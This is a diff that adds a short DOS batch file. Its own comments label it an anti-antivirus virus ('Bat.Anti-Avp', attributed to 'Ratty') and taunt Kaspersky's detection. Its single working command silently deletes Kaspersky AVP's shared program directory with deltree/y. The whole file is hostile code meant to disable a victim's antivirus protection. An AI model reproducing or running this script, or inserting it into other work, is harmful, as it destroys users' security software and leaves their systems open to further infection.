@@ -1,0 +1,6 @@
+@echo off
+rem eXPecting more from ... Ratty
+rem Bat.Anti-Avp ... Ratty's version
+deltree/y c:\progra~1\common~1\avpsha~1
+rem How many virii does Kav knows now ?
+rem 0 (Your answer is correct)
